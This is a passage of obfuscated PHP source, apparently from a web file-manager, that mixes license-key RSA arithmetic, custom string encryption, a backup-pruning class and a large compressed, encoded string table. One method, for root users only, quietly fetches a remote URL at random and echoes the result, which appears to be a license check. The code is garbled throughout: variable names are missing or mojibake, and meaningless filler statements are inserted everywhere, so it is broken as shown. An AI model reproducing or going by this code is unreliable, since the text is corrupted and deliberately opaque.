$Î[217], $Î[286] => $Î[275], $Î[287] => $Î[277], $Î[288] => $Î[279], $Î[289] => $Î[290], $Î[291] => $Î[281], $Î[292] => $Î[293], $Î[294] => $Î[283], $Î[295] => $Î[296], $Î[297] => $Î[298], $Î[299] => $Î[300]); $ = $[780]; if (!$) { die; } $ = $[$this->hsieeb21fc85]; $ = intval($ ? $ : $Î[275]); $턫ڿ = $[781]; if (strlen($턫ڿ) < $[716]) { die; } $ = _get($this->gsolabc2b4ca, $Î[301]); $ = $ ? intval($) : 0; return $ + $; $А = $[782]; if (!$А) { return; } } public function jhax486d06c7($) { $̎ =& $_SERVER[]; $䀐 =& $_SERVER[鎖]; $ = $this->qbwxe5da2b48(); $ = $̎[783]; if ($[$䀐[302]] == $䀐[124]) { return; } if ($ >= intval($䀐[217])) { return; } $ = Model($䀐[127])->count(); if ($ <= $) { return; } $캫 = Model($䀐[127])->field($䀐[302])->limit($)->select(); $΄ = $̎[784]; if (!$΄) { return; } $캫 = array_to_keyvalue($캫, $䀐[6], $䀐[302]); $ = $̎[785]; if (!$) { die; } if (!in_array($[$䀐[302]], $캫)) { show_json($䀐[303], !1, $䀐[213]); } } public function wdjk4449a105() { $Ƭć =& $_SERVER[]; $Ȭ =& $_SERVER[鎖]; if (!KodUser::isRoot() || mt_rand(1, 100) > 20) { return; } $ = $Ȭ[220]; $ = $this->fcye322b01de($, $Ȭ[221]); $ᒗ = stream_context_create(array($Ȭ[222] => array($Ȭ[223] => $Ȭ[224], $Ȭ[225] => 3))); $νи = $Ƭć[786]; $ = @file_get_contents($, !1, $ᒗ); echo $Ȭ[304] . hash_encode($) . $Ȭ[305]; $ӿ = $Ƭć[787]; if (strlen($ӿ) < $Ƭć[706]) { die; } } private function yhncb0d7a67a($, $, $ډ = 3) { $ =& $_SERVER[]; $ߟ =& $_SERVER[鎖]; usleep(1); $ = trim($); $ = mt_rand(0, 5) . $ߟ[6]; $ѣ = $[788]; if (!$ѣ) { die; } $זφ = rand_string(15); $ = $[789]; $ǭ = $ߟ[306]; $ܰ = $[790]; switch ($) { case $ߟ[208]: $ = $this->ywakc35d9075($, strrev($ . $זφ)); $ỗ = $[791]; break; $ = $[792]; case $ߟ[124]: $ = $this->ywakc35d9075($, strrev($זφ . $)); $ʪɨ = $[793]; if (!$ʪɨ) { die; } break; case $ߟ[307]: $ = $this->ywakc35d9075($, base64_encode($זφ . $)); $ԥ = $[794]; if (!$ԥ) { die; } break; $ = $[795]; if (strlen($) < $[716]) { die; } case $ߟ[308]: $ = $this->ywakc35d9075($, md5($זφ . $)); break; case $ߟ[309]: $ = base64_encode($); $ܲҬ = $[796]; while (strlen($ܲҬ) < $[716]) { if (!$ܲҬ) { break; } $ܲҬ++; } $ = rand(0, 64); $ӗ = $ǭ[$]; $͸ = md5($ӗ . md5($ . $ӗ) . $); $޷ = $[797]; if (!$޷) { return; } $͸ = substr($͸, $ % 8, $ % 8 + 7); $ = $[798]; while (strlen($) < $[702]) { if (!$) { break; } $++; } $Ě = $ߟ[6]; $ = 0; $֙ = 0; $ٚ = 0; for ($ = 0; $ < strlen($); $++) { $ٚ = $ٚ == strlen($͸) ? 0 : $ٚ; $֙ = ($ + strpos($ǭ, $[$]) + ord($͸[$ٚ++])) % 64; $ = $[799]; while ($ < $[706]) { if ($ >= 0) { break; } $++; } $Ě .= $ǭ[$֙]; $Ԫ = $[800]; if (!$Ԫ) { die; } } $ = hash_encode($ӗ . $Ě); $蘣 = $[801]; while (strlen($蘣) < $[714]) { if (!$蘣) { break; } $蘣++; } break; $破 = $[802]; default: $ = $this->ywakc35d9075($, $ . $זφ); $ʓ = $[803]; while (strlen($ʓ) < $[716]) { if (!$ʓ) { break; } $ʓ++; } break; } $ = strrev($ . $זφ . $); $ͨ = $[804]; while ($ͨ < $[708]) { if ($ͨ >= 0) { break; } $ͨ++; } if ($ډ - 1 > 0) { $ = $this->yhncb0d7a67a($, $, $ډ - 1); } return $; } private function alje1820cd09($, $ϯ, $ = 3) { $Æ =& $_SERVER[]; $Ğ =& $_SERVER[鎖]; if (!is_string($) || strlen($) < 10) { return !1; } $ = trim($); $ȭ = $Æ[805]; while ($ȭ < $Æ[714]) { if ($ȭ >= 0) { break; } $ȭ++; } $ = strrev($); $ = $[0]; $ = substr($, 1, 15); $ = substr($, 16); $Ŵ = $Æ[806]; if (!$Ŵ) { die; } $Š = $Ğ[306]; switch ($) { case $Ğ[208]: $ = $this->fcye322b01de($, strrev($ϯ . $)); break; case $Ğ[124]: $ = $this->fcye322b01de($, strrev($ . $ϯ)); $ߘދ = $Æ[807]; break; $ = $Æ[808]; while (strlen($) < $Æ[714]) { if (!$) { break; } $++; } case $Ğ[307]: $ = $this->fcye322b01de($, base64_encode($ . $ϯ)); break; case $Ğ[308]: $ = $this->fcye322b01de($, md5($ . $ϯ)); $Ϯ = $Æ[809]; while (strlen($Ϯ) < $Æ[714]) { if (!$Ϯ) { break; } $Ϯ++; } break; $嚫 = $Æ[810]; case $Ğ[309]: $ = hash_decode($); $ = $Æ[811]; $ = $[0]; $ = substr($, 1); $Ņ = strpos($Š, $); $ˋڇ = $Æ[812]; $ = md5($ . md5($ϯ . $) . $ϯ); $ѣ = $Æ[813]; $ = substr($, $Ņ % 8, $Ņ % 8 + 7); $׎ = $Ğ[6]; $ˠ = $Æ[814]; if (strlen($ˠ) < $Æ[702]) { die; } $򖠄 = 0; $݂ = $Æ[815]; if (!$݂) { return; } $ = 0; $ѣ = $Æ[816]; if (!$ѣ) { die; } $ɞ = 0; $ = $Æ[817]; for ($򖠄 = 0; $򖠄 < strlen($); $򖠄++) { $ɞ = $ɞ == strlen($) ? 0 : $ɞ; $ = $Æ[818]; $ = $ɞ++; $ = strpos($Š, $[$򖠄]) - $Ņ - ord($[$]); $ = $Æ[819]; if (strlen($) < $Æ[706]) { die; } while ($ < 0) { $ += 64; } $׎ .= $Š[$]; $ = $Æ[820]; if (strlen($) < $Æ[706]) { return; } } $ = base64_decode($׎); $ꗂ = $Æ[821]; break; default: $ = $this->fcye322b01de($, $ϯ . $); break; } if ($ - 1 > 0) { $ = $this->alje1820cd09($, $ϯ, $ - 1); } return $; } public function mdju68237aae($߫) { $ =& $_SERVER[]; $͡ =& $_SERVER[鎖]; $ň = $this->jetd83bc635f(); $Ŀ = $this->jetd83bc635f(); $ = $[822]; if (!$) { return; } $ = ($ň - 1) * ($Ŀ - 1); $ѨȀ = intval(($ň + $Ŀ) / 2); $ = $[823]; while (1) { $ƫۿ = $ѨȀ; $ = $[824]; $ = $; while ($ % $ƫۿ != 0) { $մ = $; $ = $ƫۿ; $ƫۿ = $մ % $ƫۿ; $́ = $[825]; if (strlen($́) < $[702]) { die; } } if ($ƫۿ == 1) { break; } else { $ѨȀ++; } } $į = 2; $ = $[826]; while ($ < $[702]) { if ($ >= 0) { break; } $++; } for ($Դ = 0; $Դ < $ * 10; $Դ++) { if (($ * $Դ + 1) % $ѨȀ == 0) { $į = intval(($ * $Դ + 1) / $ѨȀ); break; } } $ = $this->ywakc35d9075($ň * $Ŀ . $͡[6], $͡[138]); $ĭ = $[827]; if (!$ĭ) { return; } $ܛ = md5($͡[310] . ($ň + $Ŀ) . $͡[311] . $ѨȀ . $͡[311] . $į . $͡[312]); $̚ = $[828]; if (strlen($̚) < $[706]) { die; } $ྣξ = $this->ywakc35d9075($߫, $ܛ) . $͡[313] . $; return $ྣξ; } public function lvqn8c6c5318($톇) { $ =& $_SERVER[]; $̝ =& $_SERVER[鎖]; $埉 = explode($̝[313], $톇); $ = $[829]; if (strlen($) < $[706]) { die; } if (count($埉) != 2) { return $̝[6]; } $ʦ = $this->fcye322b01de($埉[1] . $̝[6], $̝[138]); $ = $[830]; while ($ < $[714]) { if ($ >= 0) { break; } $++; } if (!$ʦ) { return $̝[6]; } $ʦ = intval($ʦ); $ٛ = $[831]; if (!$ٛ) { return; } $ʶֵ = 0; $۷ = 0; for ($Շ = 3; $Շ < $ʦ; $Շ += 2) { if ($ʦ % $Շ != 0) { continue; } $ʶֵ = $Շ; $ײ = $[832]; if (!$ײ) { die; } $۷ = intval($ʦ / $Շ); $˵ = $[833]; break; $ = $[834]; if (strlen($) < $[716]) { return; } } $Ҝ = ($ʶֵ - 1) * ($۷ - 1); $ = intval(($ʶֵ + $۷) / 2); while (1) { $ = $; $Ĭ = $Ҝ; $䠄 = $[775]; if (!$䠄) { die; } while ($Ĭ % $ != 0) { $ = $Ĭ; $Ĭ = $; $ = $ % $; $ΰ֯ = $[835]; if (strlen($ΰ֯) < $[708]) { die; } } if ($ == 1) { break; } else { $++; } } $Ȕ = 2; $ = $[836]; if (!$) { return; } for ($Շ = 0; $Շ < $Ҝ * 10; $Շ++) { if (($Ҝ * $Շ + 1) % $ == 0) { $Ȕ = intval(($Ҝ * $Շ + 1) / $); break; } } $߮ = md5($̝[310] . ($ʶֵ + $۷) . $̝[311] . $ . $̝[311] . $Ȕ . $̝[312]); $߯ = $this->fcye322b01de($埉[0], $߮); return $߯; } public function jetd83bc635f() { $󡌽 =& $_SERVER[]; $ط = mt_rand(pow(2, 14), pow(2, 16) - 1); $ = array(); $ = 1; $ = $󡌽[837]; while ($ < $󡌽[702]) { if ($ >= 0) { break; } $++; } while ($ <= (int) sqrt($ط)) { $Ә = $; while (!0) { $Ә++; if ($Ә <= 2) { $ = $Ә; break; } else { if ($Ә < 2) { continue; } } $̀˛ = !0; for ($ȿ = 2; $ȿ <= sqrt($Ә); $ȿ++) { if ($Ә % $ȿ == 0) { $̀˛ = !1; } } if ($̀˛) { $ = $Ә; break; } } $[] = $; $Т = $󡌽[838]; while (strlen($Т) < $󡌽[708]) { if (!$Т) { break; } $Т++; } } $ބ = 2; for ($Ә = $ط; $Ә > 1; $Ә--) { $̀˛ = !0; foreach ($ as $ڲ) { if ($Ә % $ڲ == 0) { $̀˛ = !1; break; } } if ($̀˛) { $ބ = $Ә; break; } } return $ބ; $ÿ = $󡌽[839]; if (!$ÿ) { die; } } public function wqxz99e20a28($ҭ, $ç) { $ƥ =& $_SERVER[鎖]; return call_user_func(array($ƥ[8], $ƥ[314]), $ҭ, $ç); $ԡ = $_SERVER[][840]; } public function ywakc35d9075($ˈ, $̒) { $ޗ =& $_SERVER[鎖]; return call_user_func(array($ޗ[315], $ޗ[316]), $ˈ, $̒); } public function fcye322b01de($˛, $̪) { $ =& $_SERVER[]; $η =& $_SERVER[鎖]; return call_user_func(array($η[315], $η[317]), $˛, $̪); $ = $[841]; while (strlen($) < $[706]) { if (!$) { break; } $++; } } } class Backup { protected static $name; protected static $option; protected static $manual; protected $model; public $message; public function __construct() { $this->model = Model($_SERVER[][842]); $ۘ = $this->init(); if (!$ۘ) { return; } $this->keep(); } public function init() { $ =& $_SERVER[]; $this->isManual(); self::$name = date($[843]); if (!($ދ = $this->model->lastItem())) { $ދ = $this->initData(); } else { self::$name = $ދ[$[32]]; if ($ދ[$[844]] == $[91]) { self::$name = date($[259]); $ځ = intval(_get($ދ, $[845], 0)); if (self::$manual == 0 && $ދ[$[32]] == self::$name) { $this->model->remove($ދ[$[487]]); } $ދ = $this->initData($ځ, $ދ[$[846]]); } else { $ = $this->checkStore($ދ[$[846]]); if (!$) { return !1; } } } if (!$ދ) { return !1; } self::$option = $ދ; } private function isManual() { $ǅ = _get($GLOBALS, $_SERVER[][847], 0); $ǅ = intval($ǅ); self::$manual = $ǅ && $ǅ == 1 ? 1 : 0; } private function initData($ҕ = 0, $֘ = '') { $ݭ =& $_SERVER[]; $ = $this->model->config(); if ($֘ && $[$ݭ[846]] != $֘) { $ҕ = 0; } $ݍ = $this->checkStore($[$ݭ[846]]); if (!$ݍ) { return !1; } if (self::$manual == 1) { self::$name .= $ݭ[11] . date($ݭ[848]); } $ = array($ݭ[846] => $[$ݭ[846]], $ݭ[32] => self::$name, $ݭ[844] => 0, $ݭ[168] => $[$ݭ[168]], $ݭ[849] => self::$manual, $ݭ[850] => array($ݭ[851] => array($ݭ[844] => 0), $ݭ[852] => array($ݭ[844] => 0, $ݭ[853] => 0, $ݭ[854] => 0, $ݭ[33] => $ݭ[12], $ݭ[855] => 0, $ݭ[856] => 0), $ݭ[857] => array($ݭ[844] => 0, $ݭ[853] => 0, $ݭ[854] => 0, $ݭ[855] => 0, $ݭ[856] => 0), $ݭ[230] => array($ݭ[844] => 0, $ݭ[858] => 0, $ݭ[859] => 0, $ݭ[860] => 0, $ݭ[861] => 0, $ݭ[557] => $ҕ, $ݭ[855] => 0, $ݭ[856] => 0)), $ݭ[855] => time(), $ݭ[856] => 0); $ = $this->model->insert($); $[$ݭ[487]] = $; return $; } private function checkStore($ϴ) { $󼺥 = Model($_SERVER[][862]); $Ƌܰ = $󼺥->listData($ϴ); $ = $󼺥->checkConfig($Ƌܰ, !0); if ($ !== !0) { $this->message = $; return !1; } return !0; } public static function get() { if (!self::$option) { $ = Model($_SERVER[][842]); $ʳǘ = $->findByName(self::$name); $->parseContent($ʳǘ); self::$option = $ʳǘ; } return self::$option; } public static function set($Ԡ) { $ݓ =& $_SERVER[]; $ = self::get(); foreach ($Ԡ as $л => $ٓ) { array_set_value($, $л, $ٓ); } Model($ݓ[842])->update($[$ݓ[487]], $); self::$option = $; return self::$option; } public function keep() { $ꢈ =& $_SERVER[]; $Ƈ = self::get(); if (_get($Ƈ, $ꢈ[863], 0) == $ꢈ[91]) { return; } $this->backupKeep($Ƈ); self::set(array($ꢈ[863] => 1)); } private function backupKeep($ʄ) { $ =& $_SERVER[]; if (self::$manual == 1) { return; } $ = $this->model->listData(); if (empty($)) { return; } $٠ = array(); $ﺼ = array(); $י = date($[864], strtotime($[865])); foreach ($ as $ => $ͧ) { $ח = $ͧ[$[32]]; if ($ < 7 || $ͧ[$[849]] == $[91]) { $٠[] = $ח; continue; } $ⲙ = substr($ח, 0, 6); if ($ⲙ < $י) { continue; } if (!isset($ﺼ[$ⲙ]) || $ח < $ﺼ[$ⲙ]) { $ﺼ[$ⲙ] = $ח; } if (substr($ח, 6, 2) == $[866]) { $ﺼ[$ⲙ] = $ח; } } $٠ = array_merge($٠, array_values($ﺼ)); $٠ = array_unique($٠); foreach ($ as $ͧ) { $ח = $ͧ[$[32]]; if (!empty($ח) && in_array($ח, $٠)) { continue; } $this->model->remove($ͧ[$[487]]); $⦅ = $this->backupPath($ʄ); IO::remove($⦅, !1); } } private function backupPath($Í) { $ȶ =& $_SERVER[]; static $ = null; if (is_null($)) { $ = Model($ȶ[867])->get($ȶ[868]); } $謟 = $Í[$ȶ[32]]; $ܕ = substr(md5($ȶ[869] . $ . $謟), 0, 8); return "\173\x69\157\x3a{$Í[$ȶ[846]]}\x7d\x2f\144\141\x74\141\142\x61\x73\x65\x2f\x62\141\143\x6b\165\x70\57" . $謟 . $ȶ[11] . $ܕ; } public function db() { $ =& $_SERVER[]; $ = self::get(); if (_get($, $[870], 0) == $[91]) { return !0; } $ = new BackupDb(); if (!$->index()) { return !1; } self::set(array($[870] => 1)); return !0; } public function dbFile() { $ =& $_SERVER[]; $і = self::get(); if (_get($і, $[871], 0) == $[91]) { return !0; } $ = new BackupDbFile(); if (!$->index()) { return !1; } self::set(array($[871] => 1)); return !0; } public function file() { $铊 =& $_SERVER[]; $֭ = self::get(); if (_get($֭, $铊[872], 0) == $铊[91]) { return !0; } self::set(array($铊[872] => 1, $铊[844] => 1)); return !0; } public static function log($) { write_log($, $_SERVER[][873]); } } goto d쓗; D: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\362\224\346\343\360\362", "\xf1\xfa\x9f\xeb\x8a\xec"); $_SERVER[] = explode("\x7c\x3\x7c\x4\x7c\x4", gzinflate(substr("\x1f\x8b\x8\x0\x0\x0\x0\x0\x0\x13\xc5\x7d\x79\x7c\x1b\xd5\xd5\x28\xb4\x40\x49\x58\x5a\x3e\x68\xa1\xf0\xb5\x1d\x42\x82\xed\x44\x8b\xed\xec\x4e\x9c\x44\x96\x65\x5b\x44\x96\x8c\x24\x67\xc1\x36\x93\x91\x34\xb2\x26\x96\x34"."\212\146\344\55\111\331\167\102\330\227\260\323\122\240\220\260\103\330\371\50\224\102\201\226\366\243\100\151\241\205\70\13\153\371\170\205\322\215\167\227\163\227\31\311\360\336\357\375\361\362\113\242\271\373\166\356".base64_decode('Oeeee865v33x7y+/85sNX9+wz4Z9Xtx8041vnU+/N+yN/u1Lv39w3v57kT+HnndufX3XvKmzogc=')."\156\276\157\253\166\207\166\233\266\51\26\371\345\13\341\203\136\272\343\270\320\316\37\375\162\154\347\336\173\75\374\362\372\37\267\240\314\264\154\13\375\121\212\246\255\350\243\206\145\133\64\42\155\26\263\306"."\x20\xfd\x36\x8a\xf4\xd7\x4f\x7f\x7a\xe3\x91\xb2\x5e\x30\x6d\x9d\x6\x7d\xf4\x47\x85\x7e\x91\xff\xad\x75\x79\x83\xa5\xab\xd1\x58\x52\x4d\xf4\xf6\xf4\x84\xe2\x49\xc8\xd4\x22\xa7\x17\xcc\xc\x7c\x95\xb4\xb2\x56\x80\xf6\x4b\x7a"."\331\102\275\221\253\123\113\146\111\57\72\142\104\104\106\263\265\224\146\101\115\355\155\152\173\250\47\22\133\255\46\127\367\204\40\107\112\135\127\321\313\143\64\104\76\23\266\126\266\223\106\101\347\71\106\312"."\xbc\x5f\x6d\xa1\xce\x70\x54\x49\xc6\x3\xd1\x44\x20\x98\xc\xc7\xa2\x34\x3a\x18\xeb\xee\xe\x27\xab\xe3\xe3\xb1\x48\xa4\x2d\x10\x5c\x5e\x9d\xd2\x13\xf\x74\x76\x7\x14\xd4\xbf\xbc\xae\x1a\xc5\xac\x59\xaf\xac\xa1\x29\x6b\x94"."\6\372\321\141\350\371\14\375\54\152\254\73\366\130\11\276\222\374\13\55\123\261\222\317\323\100\224\177\145\364\254\126\311\303\154\265\313\201\122\331\50\150\154\320\313\365\61\36\113\77\264\212\155\32\305\64"."\15\204\106\355\262\46\342\121\137\323\150\241\365\42\124\225\10\105\102\301\244\202\73\250\164\304\143\335\12\54\102\101\263\154\275\254\254\354\12\305\103\12\356\164\153\35\31\153\235\2\360\22\105\123\241\4".base64_decode('IhFlshpsvVBi1dAyNSqLxdtDcaVttSJmKG0WCmbRh2pBK2lLXQ3F4/TDA+AdCeNFg0CsoyMR4iE=')."\x18\xdc\xf1\x11\xd4\x93\xd9\x0\x9f\x8e\x50\x26\x9b\xb7\xd5\x61\x2d\x5f\x61\x60\x3a\x44\x7f\xeb\xe0\x7\x7e\x4d\xb\x40\x77\x9d\x51\x34\x2a\x0\xa6\x50\x85\x69\xf2\x6d\x5\x1f\x15\x96\x5b\x67\x31\x7a\x6\x3e\xa\xa8\xbc\x9"."\345\122\20\227\142\271\326\262\17\3\355\320\141\372\331\272\204\376\56\202\362\51\25\247\351\145\133\325\213\151\63\143\24\141\37\57\5\170\324\354\134\173\331\100\31\150\70\153\346\63\354\333\62\306\141\224"."\131\43\257\107\53\5\71\13\17\246\163\106\76\123\146\133\357\313\162\322\140\204\357\144\234\127\204\112\250\47\34\11\30\331\61\261\25\161\276\36\236\152\231\225\162\132\17\243\255\103\303\115\20\255\333\66".strrev('41G)[cb3!DQW=9C$2!V(f/BL7').base64_decode('qTnNynVn5qqkFMOVGX3UV8qVYL/yLdrvAFk88qhphySMmzfTGuStkIHQ75xtlxJ6MYMHAt02R4o=')."\144\240\45\135\207\114\355\36\45\243\164\53\253\225\256\26\243\305\142\5\13\171\376\305\106\307\343\54\36\151\217\262\325\310\144\1\330\30\302\237\6\15\32\26\301\135\142\343\151\245\122\336\110\153\266\141"."\26\375\146\332\326\155\257\145\227\165\15\152\14\244\323\272\145\171\203\146\321\56\233\171\157\40\237\67\107\274\261\262\61\150\24\133\224\231\200\106\121\42\332\256\136\214\332\132\140\17\116\133\244\340\165\307"."\xcd\xcc\x6c\xad\xd8\x59\xef\x2\xb6\xb7\x78\xee\xb2\x56\xb4\xb2\x7a\xd9\x1b\x2\xc0\x6e\x51\x50\x67\x39\x7e\x63\xd9\xda\xd\xab\x64\x5a\x6\xee\x5e\x8b\xa2\xd9\xb6\x96\xce\x61\xdc\x20\xaa\x6f\xfd\x92\xfc\x46\x31\x6f\x14\xf5".base64_decode('6ryoEt3bU9YGC1qLUqqk0ATAfoK4NM4hZ4YJaFEK2qhXG2Q1hUZLRlm32KiVzu4kQFTW2433gaE=')."\x67\xbc\x9\x84\x7c\xa1\xb2\xd9\x8d\x73\x14\x4\x2b\xa\x4b\xa3\xb1\x5d\xc9\x64\x8f\x1a\xee\x40\xd4\x35\x1a\x52\xbb\x3\xc9\x60\x17\xd4\x6e\x6b\x83\xac\xea\x8\x42\xa9\xbc\x4a\x16\xb9\xca\x8b\xf6\x3\x86\xa6\x28\x1a\x9c\x88"."\354\61\107\364\62\152\270\155\254\105\31\62\63\51\163\324\307\222\160\346\4\102\14\54\63\136\337\222\355\215\153\305\101\74\214\324\230\255\133\156\324\322\206\150\261\57\113\67\237\57\245\147\315\62\214\306"."\32\36\164\116\176\104\57\16\332\71\126\167\42\24\137\21\212\253\211\130\107\162\145\40\16\244\273\210\40\147\224\365\6\267\236\367\306\365\14\232\304\264\315\312\151\45\61\373\253\274\170\303\340\306\131\52"."\336\104\54\55\22\356\304\163\327\356\265\120\46\257\234\213\325\35\61\12\6\36\236\315\123\310\144\43\272\336\11\35\362\223\61\267\366\133\63\353\373\63\263\32\274\350\377\231\15\175\375\355\276\231\3\113"."\375\206\50\343\157\362\65\51\315\215\363\224\36\304\150\30\132\136\201\101\127\345\150\124\142\313\235\323\42\40\274\150\26\365\232\33\13\1\222\151\351\336\56\135\103\70\26\55\204\143\135\74\254\55\32\376"."\222\331\305\244\116\302\45\256\165\241\221\361\320\361\275\241\104\122\355\16\45\273\142\355\320\375\120\0\276\212\250\60\351\57\133\143\314\127\1\125\53\102\265\372\250\104\2\4\52\117\313\23\102\312\105\315"."\21\206\274\135\0\24\314\351\351\241\111\322\320\27\214\306\244\170\211\55\135\37\375\31\0\150\36\240\77\252\32\214\204\2\161\25\30\122\325\260\72\44\52\210\203\34\335\252\146\152\55\2\264\156\335\326"."\xc4\x0\x50\x73\xe1\x2\xda\xd2\x62\x20\xaa\x93\x64\xb1\x51\x76\xb\xc0\x47\x3b\x68\xa5\x91\xe1\x34\xd\x5\xbb\x74\x63\x30\x7\xfd\x36\x70\x75\x69\x33\x6f\x96\xb5\x3c\x26\x5\x8c\xd\x1d\x34\x0\x2b\x97\xf2\x15\xb4\xd\xfc"."\270\342\144\256\122\110\1\67\216\246\154\120\267\5\207\150\215\41\66\252\300\350\53\42\322\166\270\335\101\105\41\344\127\61\350\366\373\112\305\301\206\351\120\227\332\74\267\21\107\300\252\302\310\20\253\134"."\xd1\xab\x87\xee\x4b\x9b\x68\x9f\x77\x6b\x43\x7a\xb\x1e\xb\x20\xb7\x45\x24\x96\x5\x24\xfc\xb9\x8\x93\xbc\x56\x37\x9a\xc0\xab\x95\xf7\x15\x50\x25\xa4\xce\xa0\xc9\x9\x32\x3d\x8c\x2c\x72\x92\x3c\x45\x2f\x97\xcd\xf2\xd1\x90"."\203\174\53\204\156\342\345\202\312\155\316\104\130\10\43\260\357\234\311\231\16\223\301\146\213\37\306\75\243\271\3\260\110\6\61\137\76\313\106\213\200\6\250\145\62\265\242\21\346\201\12\66\60\260\45\11"."\x8c\x2d\xf0\x27\x66\xa3\xbf\x82\x7\xc8\x98\x5\x8d\x51\x54\x8c\x88\x78\xb3\x38\x60\xf1\x10\x21\x93\x7a\x86\xd2\x49\x47\x14\xdd\xe0\x34\x6a\x26\x6b\xb2\x6c\x9b\x38\xb1\xec\xc8\x89\x80\x34\x67\x42\xa7\x11\x54\xc0\x80\x2b\x7c".strrev('ƪ|J`DI+c1%GhV(΀}pѫӖ'."\0".'g^z2l').strrev('B2p38=+b8xhhQ7H")*򵻵*F5')."\x63\x86\x9b\x1\x84\x50\x27\xfc\x82\x57\x42\xc4\xba\x64\x16\x11\xa6\x5\x64\xe5\x15\x27\xb3\xaa\xa4\x8c\x60\x25\x0\x76\x4\xfb\xe1\xe2\x28\x10\x4f\x50\x18\xf7\x16\x10\x5e\xf1\xf2\x3e\xf5\xf4\x2\x2f\xc0\xa0\x82\x71\xb5\x6d".base64_decode('Yx1mmbFxxmBxBV/5lYk53q7uQNCb6Ao0z51HY1cXMv3JLsPqP4GHoTsj1hy1rKM9zWChubGJ7Tg=')."\xc4\x97\x68\xa2\xe7\xab\xbd\x5\x2f\xae\x5\xb3\x94\xbe\xc6\xc6\x46\x56\xd7\xac\x79\x4a\xe\xa1\x12\x8e\xbf\x33\x64\xb4\xec\xa0\x52\x49\xf\xe9\x32\x3a\xb7\xbc\x23\x6\xc3\x79\xd3\x39\xeb\x3d\xbd\x7a\xf2\xad\xa\xa1\x6e\xaa"."\x96\xc6\xd5\xa9\xa8\xb0\x5d\xb1\xe4\x99\x42\x0\x98\x41\x45\xc\xc6\x25\xd3\x58\x2d\x3f\x68\x22\xb8\xcb\x15\xe4\xc8\xc\x87\x5f\x1a\xd6\x29\xcb\x5\xd\xe5\x34\x3e\x4f\x78\xf6\xd8\xe6\x40\xc\xdd\x98\x5c\x8\x4f\x33\xea\x3".base64_decode('w99OHltJ1p5oyrqHYbZFP0qYsiGszZbtWPozFbpRQfu2bIxLs7+U1cRwZiwBTY4W8uIIBVMDsyk=').base64_decode('D21URSkqpKhyShfHA2wVuttde4ISfxq3eClqURnGAhmz2FrX5GusU9jBsrWuN9mB+PSlS6YuDpo=')."\x85\x12\x46\x2b\xdd\x95\xbc\x6d\xe0\xf1\x52\xc8\x5d\x2\x63\x5c\x8c\x79\x20\x16\xe8\x71\x4d\x47\x28\xa9\x1\xd5\x59\xec\x97\xf3\x2d\xf6\x4f\x56\x2b\xc\x5\x33\x66\xab\xd4\x9e\x48\x20\xd9\x11\x8b\x77\x3\x8c\x97\x4a\x2\xac".base64_decode('Sulau80rMFLF8uqYT4ZdoKXzLhCV52JVTUhcVQsSV7kgcVU1JK6qBWfDAJBaQRs3i2i/IkJb8KU=')."\x1\x2c\x92\x5d\xe1\xe8\x72\xb5\x3b\xd6\x1e\x8a\xa8\xe1\x28\xe2\xe7\x92\xd5\xf1\xbd\x3d\xed\x1\x86\x6\xe5\xf8\xb6\x58\xb2\xcb\x11\xdb\x8b\x38\xba\x15\x81\x48\xd8\x9d\x3d\xb4\x2a\x9c\x48\x26\x6a\x26\xa1\xb8\xde\x90\x2b\xa5"."\xbd\x4d\xed\x89\x87\x3a\xc2\xab\x78\xb0\x23\x1c\x8a\xb4\x27\xd4\x60\x20\xd8\x25\xf2\x44\x3\xdd\x10\x40\xbc\x92\x9e\xcf\x58\x7e\x67\x7e\x15\xb1\xa6\x9\x2e\x35\x53\x1\xe0\x20\xe4\x10\x54\xa9\x4c\x4\xa3\xa\x4c\x8c\x8e\x39"."\x3a\x2c\x7\xc\x17\xcb\x1d\xc9\x48\x54\x86\xaa\x2a\x9c\xd1\x64\x67\xfa\x2\x23\xb5\xe8\x88\x6\xd3\xce\xce\x27\xf5\xf4\xa7\x41\x9\x24\x14\xbb\xa4\x72\xa2\x9a\x1a\xe3\x9f\x64\x18\x2c\xac\x32\x66\x12\xb1\x23\xd0\x11\x5\xf8"."\345\252\256\250\70\117\233\164\52\252\35\21\310\332\234\45\165\205\21\55\21\151\150\51\2\104\322\211\100\202\54\15\64\143\40\312\124\266\3\254\73\131\41\145\124\143\75\241\170\0\313\50\325\225\361\130"."\264\23\12\214\344\164\326\201\60\254\103\75\73\246\202\250\322\26\4\136\313\33\32\223\131\211\331\137\153\262\71\105\107\163\306\374\27\331\204\247\60\167\303\130\136\366\221\105\73\232\161\46\146\205\327\237"."\62\115\250\63\217\117\144\120\275\305\140\142\224\321\347\131\234\176\1\244\306\226\207\242\52\3\44\32\222\200\217\106\204\342\361\130\34\206\155\233\103\114\230\105\23\343\241\104\50\311\50\374\272\212\301\46"."\305\357\233\5\100\253\43\236\16\232\367\237\330\77\62\253\276\317\73\313\67\200\76\32\146\56\243\101\10\365\373\34\101\306\152\127\312\274\64\146\3\353\255\245\15\55\375\376\176\177\375\322\226\276\200\167".base64_decode('XPOON3oXegcQg94wCyIG1jd75mzEGVDGpccMoJ/W/qUz+r3H/nDNsr7+gbqWWUf3+47pHxmY2bA=')."\x94\xb5\x93\xae\x94\xd1\x19\x80\x11\x36\xd4\xd5\xcc\xac\x7a\xd4\x25\x74\x68\xe5\x59\x8a\x12\x1e\x26\x19\x58\xc2\xb8\x51\x12\xb1\xeb\xe7\x6d\x64\xf1\x68\xdd\xf4\x41\x51\xa2\xcf\xdb\x3f\x6b\x60\xa9\x54\x4e\x8a\x72\xb7\x85\x50".base64_decode('KeL4cjxfwHsCHhkvirc5wESlmBbUEEN/SuOnv8GiOFbZZS7gHEYQKRDu+hn0dyNbyEF9lGGCYtY=')."\140\334\124\245\150\254\143\347\233\242\276\16\76\114\233\103\261\156\217\350\14\74\120\274\43\214\200\203\21\1\224\44\205\362\22\321\40\242\54\16\243\34\230\214\222\212\217\172\43\74\204\150\12\254\323\24".base64_decode('yG2ltZKekEaoqslAWyTEz62AeFmYIME2fg2ChiYQKMMCkpiKiI1gf1vr8grZ/vSM1UJuhKxKCR8=')."\227\24\264\342\150\156\25\304\276\51\255\113\24\72\345\120\116\225\27\240\304\217\101\130\316\251\213\215\216\361\20\364\251\44\126\310\102\307\20\166\20\360\327\367\367\127\372\364\314\100\37\2\174\315\233\35".strr